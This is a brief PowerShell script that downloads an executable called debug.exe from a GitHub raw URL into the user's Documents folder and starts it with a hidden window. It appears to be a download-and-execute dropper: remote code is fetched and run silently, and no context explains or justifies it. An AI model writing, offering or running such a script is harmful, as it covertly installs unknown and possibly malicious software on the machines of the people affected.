# URL of the executable file to download
$exeUrl = "https://raw.githubusercontent.com/Mxfire0324/hi.ps1/main/debug.exe"

# File path where the executable will be saved
$exeFilePath = "$env:USERPROFILE\Documents\debug.exe"

# Download the executable file
Invoke-WebRequest -Uri $exeUrl -OutFile $exeFilePath

# Run the executable file silently
Start-Process -FilePath $exeFilePath -WindowStyle Hidden
